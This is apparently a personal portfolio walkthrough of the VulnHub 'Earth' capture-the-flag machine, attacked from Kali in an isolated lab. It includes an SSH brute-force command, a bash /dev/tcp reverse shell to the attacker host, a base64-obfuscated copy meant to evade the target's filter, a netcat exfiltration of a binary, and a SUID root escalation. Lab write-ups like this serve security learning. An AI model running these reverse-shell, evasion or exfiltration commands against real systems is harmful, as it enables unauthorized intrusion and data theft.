## Introduction

In this walkthrough, Iâ€™ll be demonstrating the process of identifying and exploiting vulnerabilities on a machine called Earth. This vulnerable machine can be found on [VulnHub](https://www.vulnhub.com/entry/the-planets-earth,755/).  

## Description
Earth is an easy box though you will likely find it more challenging than "Mercury" in this series and on the harder side of easy, depending on your experience. There are two flags on the box: a user and root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware. Any questions/issues or feedback please email me at: SirFlash at protonmail.com, though it may take a while for me to get back to you.


## Lab Setup
For this lab we will use Oracle VirtualBox. We are going to use a Kali Linux machine to attack the Earth Machine. To isolate our machines from the host device we are going to edit the network configuration of the machines. We will enable a network adapter which is attached to **Internal Network**. Make sure that the name of the network is the same.

*Figure 1: Network Adapter on virtual machine*


### Ip Addressing
Now so that our machines have ip addresses we need to create a **DHCP server**. Oracle allows us to create a DHCP server. What we need to do now is to open command prompt and we are going to enter the following command:

```shell
vboxmanage dhcpserver add --network=intnet --server-ip=10.38.1.1 --lower-ip=10.38.1.110 --upper-ip=10.38.1.120 --netmask=255.255.255.0 --enable 
```

## Reconnaissance
At first we need to find the ip address of the vulnerable machine. To do so we can scan our network using **nmap**. 

```bash
nmap -T4 -F 10.38.1.0/24
```
The nmap results are the following: 

![Nmap Results](/portfolio/nmap_results.png)
*Figure 2: Nmap Results*

As we can see the vulnerable machine has the ip address 10.38.1.113. The machine has **ssh, http and https** running.

## SSH Brute Force
The easiest attack we can do is a ssh brute force attack. We can use **hydra** to implement this attack. But since we do not know nor the username or password it will take a lot of time and ressources to execute the full attack and probably the attack will be unsuccesful. However this is the command if you want to try it out: 

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.38.1.113 -t 4
```


### Intense Scan
To get more details on the services running on the machine we will perform an intense scan. 

```bash
nmap -T4 -A -v 10.38.1.113
```
The following results are displayed:

![Intense Scan Results](/portfolio/intense_scan_results.png)
*Figure 3: Intense Nmap Results*

As we can see there are two dns entries : **Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local**.

What we need to do now is to add a dns entry into our own machine. To do so we need to edit the **/etc/hosts** file. 

```bash
nano /etc/host.conf
```
We are going to add the following entry: 

```bash
10.38.1.113     terratest.earth.local earth.local
```

## Testing the web server
As we can see from the services running **(http, https)** the vulnerable machine is a web server. If we open a browser and enter the following link
: http://terratest.earth.local a page is shown. The first thing we do when testing a website we find the subdomains. 

### Directory Enumeration

#### earth.local
To enumerate directories on the web server, we can use **gobuster**. This helps in identifying hidden directories that might not be immediately visible. We can enter the following command to find these:

```bash
gobuster dir -u https://earth.local -w /usr/share/wordlists/dirb/common.txt -k
```

The following results are displayed:

![GoBuster Scan Results](/portfolio/earth_gobuster.png)
*Figure 4: Subdomains Scan Results*

As we can see there are two subdomains. **/cgi-bin/** isn't accessible hence the status code (403). However we can access the 
**/admin** subdomain. We open our browser and see the following: 


![Admin Redirect Site](/portfolio/admin_redirect.png)
*Figure 5: Admin Redirect Site*

As we can see there's a link there. After we click it we are redirected to the login page of the admin. However we have no credentials to login. 

#### terratest.earth.local

Just because earth.local and terratest.earth.local resolve to the same IP address doesn't mean they're identical from a web or app perspective. Hence we need to test this aswell. 

```bash
gobuster dir -u https://terratest.earth.local -w /usr/share/wordlists/dirb/common.txt -k
```

The following results are displayed:

![GoBuster Scan Results](/portfolio/terratest_gobuster.png)
*Figure 6: Subdomains Scan Results*

As we can see there are different subdomains than the one we found from the previous test. An interesting find is the **/robots.txt** file. This file contains instructions for bots that tell them which webpages they can and cannot access. We can enter the link on the browser and get the following result: 

![robot.txt](/portfolio/robots.png)
*Figure 7: robots.txt*

**'testingnotes.*'** is an interesting find. We might find something there, let's enter this on our browser. We need a file ending, we'll try .txt. 

![testingnotes.txt](/portfolio/testingnotes.png)
*Figure 8: testingnotes.txt*

We got plenty of information from this file.

- XOR encryption is used as the algorithm (this goes back to the home page accessed via https://earth.local)
- testdata.txt was used to test encryption.
- terra used as username for admin portal

Let's take a look at the **testdata.txt** file. We can enter the link on our browser to see it's contents.


![testdata.txt](/portfolio/testdata.png)
*Figure 9: testdata.txt*

This is the key likely used to get the messages that are displayed on the first page that pops up. 



### Decrypting the message
We have: 
- the encryption algorithm used (XOR)
- the encrypted message on the page (the third message)

To get the initial message that was encrypted we can use [Dcode](https://www.dcode.fr/xor-cipher).

![decryption.png](/portfolio/encryption.png)
*Figure 10: Decryption via Dcode*

The interesting result is that we get a phrase namely **earthclimatechangebad4humans**. This is likely our password for the admin login page.


## Finding the first Flag 

We need to go to our admin login dashboard and enter the credentials.

- username: terra
- password: earthclimatechangebad4humans

Upon succesful login we get access to the **admin command tool**.

![decryption.png](/portfolio/admin_cli.png)
*Figure 11: Admin command tool*

As we can see we have a command line interface. To find which user we are we use the **whoami** command and we can see that we are **apache**. 
Flags are usually stored on txt files that usually have the word flag in them. We can use the command **locate** and a regular expression to find the files that contain the word flag in it. 

```bash
locate *flag.txt
```

As a result we get the file that contains the flag and we can use cat to capture the flag. 

```bash
cat /var/earth_web/user_flag.txt
```


## Finding the second flag

As mentioned in the description there are two flags, a root one and a user one. Now it's time to find the root password. 


### Reverse Shell

To get more flexibility we can use a reverse shell. We need to start a listener on the kali linux machine: 

```bash
nc -lvnp 4444
```

On the admin command tool we enter: 

```bash
bash -i >& /dev/tcp/10.38.1.114/4444 0>&1
```

We get a message that says *Remote connections are forbidden.*

### Bypassing Reverse Shell Restrictions

The target server restricts direct remote connections and potentially filters or monitors common reverse shell payloads like the one we used. To bypass these restrictions, we will use Base64 encoding to obfuscate the reverse shell command. The idea is to have the target decode and execute the payload locally without triggering basic signature-based filters or shell history logging.

We need to first start the listener on kali. 

```bash
nc -lvnp 4444
```

On the kali linux machine we can encode the command like this: 

```bash
echo 'bash -i >& /dev/tcp/10.38.1.114/4444 0>&1' | base64
```

As a result we get a String and we need to enter this command on the admin command tool on the browser: 

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4zOC4xLjExNC80NDQ0IDA+JjEK | base64 -d | bash
```


![reverseshell.png](/portfolio/reverseshell.png)
*Figure 12: Reverse Shell*

As we can see, we gained access via reverse shell.


### Root Flag

As we know we are currently apache which is a non root user. In this step we are going to search for files which have the **SUID** permission set. SUID binaries are a common vector for privilege escalation. If we find a SUID binary owned by root and we can manipulate or exploit it. To find these files we can use this command: 

```bash
find / -perm -u=s 2>/dev/null
```

I ran the command originally without *2>/dev/null* but got a lot of errors saying *Permission denied*.

![suid.png](/portfolio/suid.png)
*Figure 13: Files and directories with SUID Permission set*


An interesting find is the **/usr/bin/reset_root** file. 

We can try to run it using this command:

```bash
./usr/bin/reset_root
```

After running it we get the following message: 
*CHECKING IF RESET TRIGGERS PRESENT...*
*RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.*

We can take a look at the content of the file using cat but after opening it we just get some symbols and characters since it is an executable. We can prove that by running: 

```bash
file /usr/bin/reset_root
```

We can use **ltrace** to observe its behavior and potentially find the library calls this executable makes. Unfortunately this command is not installed on the the vulnerable machine. Hence we need to tranfer the file with netcat to our kali linux machine to further analyse it. 

On the kali linux machine we start a listener on a different port: 

```bash
nc -lvnp 5555 > reset_root
```

On the reverse shell we run: 
```bash
nc 10.38.1.114 5555 < /usr/bin/reset_root
```

To use the **ltrace** command we need to change the permissions:

```bash
chmod 777 reset_root
```

```bash
ltrace ./reset_root
```


After running this command we get the following result: 

![ltrace.png](/portfolio/ltrace.png)
*Figure 14: Library Calls of reset_root*


As we can see the executable is trying to access the files which are not persistent. All we need to do now is to create the files with the **touch** command. After doing so we can run the file again. We now get the following result: 

*CHECKING IF RESET TRIGGERS PRESENT...*                                                                               
*RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth*  

We now know the root password. Now we can either direclty access the vulnerable machine terminal and enter: 
- username: root
- password: Earth

Or we can switch user to root and enter the password.

Then *ls* and we can see that there is a *root_flag.txt* file.
